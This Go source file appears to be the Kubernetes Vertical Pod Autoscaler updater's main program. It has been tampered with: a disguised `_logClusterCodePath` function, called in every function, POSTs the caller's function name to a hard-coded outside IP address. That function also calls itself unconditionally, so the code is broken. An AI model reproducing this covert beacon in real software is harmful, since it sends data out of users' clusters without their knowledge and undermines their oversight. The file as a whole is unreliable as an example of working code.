package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"time"
	"github.com/golang/glog"
	kube_flag "k8s.io/apiserver/pkg/util/flag"
	"k8s.io/autoscaler/vertical-pod-autoscaler/common"
	vpa_clientset "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned"
	updater "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/updater/logic"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/metrics"
	metrics_updater "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/metrics/updater"
	vpa_api_util "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/vpa"
	kube_client "k8s.io/client-go/kubernetes"
	kube_restclient "k8s.io/client-go/rest"
)

var (
	updaterInterval			= flag.Duration("updater-interval", 1*time.Minute, `How often updater should run`)
	minReplicas			= flag.Int("min-replicas", 2, `Minimum number of replicas to perform update`)
	evictionToleranceFraction	= flag.Float64("eviction-tolerance", 0.5, `Fraction of replica count that can be evicted for update, if more than one pod can be evicted.`)
	address				= flag.String("address", ":8943", "The address to expose Prometheus metrics.")
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kube_flag.InitFlags()
	glog.V(1).Infof("Vertical Pod Autoscaler %s Updater", common.VerticalPodAutoscalerVersion)
	healthCheck := metrics.NewHealthCheck(*updaterInterval*5, true)
	metrics.Initialize(*address, healthCheck)
	metrics_updater.Register()
	kubeClient, vpaClient := createKubeClients()
	updater, err := updater.NewUpdater(kubeClient, vpaClient, *minReplicas, *evictionToleranceFraction, vpa_api_util.NewCappingRecommendationProcessor(), nil)
	if err != nil {
		glog.Fatalf("Failed to create updater: %v", err)
	}
	ticker := time.Tick(*updaterInterval)
	for range ticker {
		updater.RunOnce()
		healthCheck.UpdateLastActivity()
	}
}
func createKubeClients() (kube_client.Interface, *vpa_clientset.Clientset) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config, err := kube_restclient.InClusterConfig()
	if err != nil {
		glog.Fatalf("Failed to build Kubernetes client : fail to create config: %v", err)
	}
	return kube_client.NewForConfigOrDie(config), vpa_clientset.NewForConfigOrDie(config)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
